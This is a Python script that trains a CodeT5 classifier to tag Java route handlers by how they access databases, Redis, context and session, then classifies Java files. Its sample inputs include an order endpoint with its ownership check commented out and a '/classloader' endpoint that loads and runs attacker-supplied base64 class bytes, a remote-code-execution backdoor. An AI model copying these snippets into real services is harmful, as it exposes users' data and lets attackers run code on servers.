import argparse
import glob
import json
import os
import re

from datasets import Dataset

from transformers import pipeline, T5ForSequenceClassification, RobertaTokenizer, TrainingArguments, Trainer, \
    T5Tokenizer, AutoTokenizer, AutoModelForSequenceClassification, AutoModelForSeq2SeqLM, T5ForConditionalGeneration

codet5_dir = 'codet5-base'
bert_dir = 'bert-base-uncased'

# label2id = {'none': 0, 'r_db': 1, 'w_db': 2, 'r_redis': 3, 'w_redis': 4, 'b_db': 5, 'b_redis': 6}
# label2id = {'none': 0, 'r_db': 1, 'w_db': 2, 'r_redis': 3, 'w_redis': 4, 'b_db': 5, 'b_redis': 6, 'r_db_r_redis': 7, 'b_db_r_redis': 8}
# label2id = {'none': 0, 'r_db': 1, 'w_db': 2, 'b_db': 3,'r_redis': 4, 'w_redis': 5, 'b_redis': 6, 'r_ctx': 7, 'w_ctx': 8, 'b_ctx': 9, 'r_db_r_ctx': 10, 'w_db_r_ctx': 11, 'b_db_r_ctx': 12}
label2id = {'none': 0, 'r_db': 1, 'w_db': 2, 'b_db': 3,'r_redis': 4, 'w_redis': 5, 'b_redis': 6, 'r_ctx': 7, 'w_ctx': 8, 'b_ctx': 9, 'r_session': 10, 'r_db_r_ctx': 11, 'w_db_r_ctx': 12, 'b_db_r_ctx': 13, 'r_db_b_session': 14, 'b_db_b_session':15}
id2label = [item for item in label2id.keys()]


def merge_spaces(input_string):
    # 使用正则表达式将任意多个空格替换为一个空格
    return re.sub(r'\s+', ' ', input_string).strip()


def infer_with_pipeline(text, tokenizer, model, device=0):
    text = text.replace(' ', '')
    p = pipeline('text-classification',
                 model=model,
                 tokenizer=tokenizer,
                 device=device,
                 top_k=None)
    results = p(text)
    return results


def train(opt):
    # load model
    print(f'[+] load model: {opt.model_name}.')
    model = T5ForSequenceClassification.from_pretrained(opt.model_name, num_labels=opt.num_labels, trust_remote_code=True)
    tokenizer = AutoTokenizer.from_pretrained(opt.model_name, trust_remote_code=True)
    # model.config.decoder_start_token_id = tokenizer.pad_token_id

    def preprocess_example(examples):
        labels = [label2id[label] for label in examples['label']]
        examples['code'] = [merge_spaces(code) for code in examples['code']]
        model_inputs = tokenizer(examples['code'], truncation=True, padding='max_length', max_length=1024, return_tensors='pt')
        model_inputs['label'] = labels
        return model_inputs

    print(f'[+] load data.')
    with open(os.path.join(opt.data_dir, 'data.json'), 'r', encoding='utf-8') as f:
        data = json.load(f)
    train_dataset = Dataset.from_list(data['train'], )
    dev_dataset = Dataset.from_list(data['dev'])
    test_dataset = Dataset.from_list(data['test'])

    # preprocess data
    train_dataset = train_dataset.map(preprocess_example, batched=True, remove_columns=['code'])
    dev_dataset = dev_dataset.map(preprocess_example, batched=True, remove_columns=['code'])
    # test_dataset = test_dataset.map(preprocess_example, batched=True, remove_columns=['code'])

    if not os.path.exists('classifier'):
        os.makedirs('classifier')
        
    # setup config
    train_config = TrainingArguments(
        output_dir='./classifier',
        eval_strategy='epoch',
        learning_rate=2e-5,
        per_device_train_batch_size=1,
        per_device_eval_batch_size=1,
        num_train_epochs=opt.epoch_num,
        weight_decay=0.01,
        fp16=True
    )

    # init trainer
    trainer = Trainer(
        model=model,
        args=train_config,
        train_dataset=train_dataset,
        eval_dataset=dev_dataset
    )

    # start train
    print(f'[+] start train.')
    trainer.train()
    print(f'[+] train done.')


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--model_name', type=str, default=codet5_dir)
    parser.add_argument('--check_point', type=str)
    parser.add_argument('--tokenizer', type=str, default=codet5_dir)
    parser.add_argument('--data_dir', type=str, default='./data/text_classification')
    parser.add_argument('--epoch_num', type=int, default=50)
    parser.add_argument('--do_train', type=int, default=1)
    parser.add_argument('--num_labels', type=int, default=len(label2id))
    parser.add_argument('--predict_dir', type=str)
    opt = parser.parse_args()

    if opt.do_train:
        train(opt)
    else:
        text = """
        public static String Func(int userId) {
        String userName = null;

        // load jdbc driver
        try {
            Class.forName("com.mysql.cj.jdbc.Driver");
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
            return null;
        }

        // connect to mysql database
        try (Connection connection = DriverManager.getConnection(JDBC_URL, JDBC_USER, JDBC_PASSWORD);
             PreparedStatement preparedStatement = connection.prepareStatement("SELECT name FROM users WHERE id = ?")) {
            
            // set up parameter
            preparedStatement.setInt(1, userId);
            
            // execute query
            try (ResultSet resultSet = preparedStatement.executeQuery()) {
                if (resultSet.next()) {
                    userName = resultSet.getString("name");
                }
            }
        } catch (SQLException e) {
            e.printStackTrace();
        }

        return userName;
        }
        """

        text = '''@GetMapping(\"get-order\")\n @Parameter(in = ParameterIn.HEADER,name= SecurityConstant.TOKEN_HEADER,schema = @Schema(type = \"string\"))\n    public ResponseEntity<OrderDto> GetOrder(@RequestParam(defaultValue = \"0\") int id) {\n        OrderDto orderDto = new OrderDto();\n        Map<String,Object> Order = orderService.getOrder(id);\n        if(Order == null){\n            return new ResponseEntity<>(orderDto, HttpStatus.OK);\n        }\n        Authentication authentication = SecurityContextHolder.getContext().getAuthentication();\n        logger.warn(authentication.getName());\n        logger.warn((String) Order.get(\"order_owner\"));\n        //if(authentication.getName().equals(Order.get(\"order_owner\"))){\n        orderDto.setGoods(Order.get(\"goods\").toString());\n        orderDto.setPrice(Integer.parseInt(Order.get(\"price\").toString()));\n        orderDto.setAmount(Integer.parseInt(Order.get(\"amount\").toString()));\n            //return new ResponseEntity<>(orderDto, HttpStatus.OK);\n        //}\n        return new ResponseEntity<>(orderDto, HttpStatus.OK);\n    };\n     @Override\n     public Map<String, Object> getOrder(Integer id) {\n        OrderDto orderDto = new OrderDto();\n        Map<String,Object> Order = datebaseCurd.GetOwnerOrder(id);\n        return Order;\n    };\n     public Map<String, Object> GetOwnerOrder(int id){\n        String sql = \"select* from orders where order_id = ?;\";\n        List<Map<String,Object>> ownerOrder = jdbcTemplate.queryForList(sql,id);\nif (!ownerOrder.isEmpty()) {\nreturn ownerOrder.get(0);} else {\nreturn null; \n}\n}'''

        text = '@RequestMapping("/classloader") public void classData() { try{ ServletRequestAttributes sra = (ServletRequestAttributes) RequestContextHolder.getRequestAttributes(); HttpServletRequest request = sra.getRequest(); String classData = request.getParameter("classData"); byte[] classBytes = java.util.Base64.getDecoder().decode(classData); java.lang.reflect.Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class); defineClassMethod.setAccessible(true); Class cc = (Class) defineClassMethod.invoke(ClassLoader.getSystemClassLoader(), null, classBytes, 0, classBytes.length); cc.newInstance(); }catch(Exception e){ logger.error(e.toString()); } }'
        # this prints: "Convert a SVG string to a QImage."
        match_regex = opt.predict_dir + '/*.java'
        files = glob.glob(match_regex, recursive=True)
        infer_res = dict()
        tokenizer = AutoTokenizer.from_pretrained(opt.model_name, trust_remote_code=True)
        model = T5ForSequenceClassification.from_pretrained(opt.check_point, num_labels=opt.num_labels)
        nl_model = T5ForConditionalGeneration.from_pretrained("codet5-base-multi-sum")
        for file in files:
            with open(file, 'r', encoding='utf-8') as fp:
                content = fp.readlines()
            _route = os.path.basename(file).split('.')[0]
            infer_res[_route] = infer_with_pipeline(' '.join(content), tokenizer, model)
            input_ids = tokenizer(' '.join(content), return_tensors="pt").input_ids
            generated_ids = nl_model.generate(input_ids, max_length=2048)
            nl = tokenizer.decode(generated_ids[0], skip_special_tokens=True)
            print("===========================\n" + nl + "\n=============================\n")
        res_labels = dict()
        for result in infer_res:
            res_label = None
            res_score = 0.0
            result_value = infer_res[result][0]
            for item in result_value:
                if item['score'] > res_score:
                    res_score = item['score']
                    res_label = item['label']
            res_labels[result] = (res_label, res_score)
        for k, v in res_labels.items():
            print(f'[+] route: {k}, label: {id2label[int(v[0].split("_")[-1])]}, score: {v[1]}')
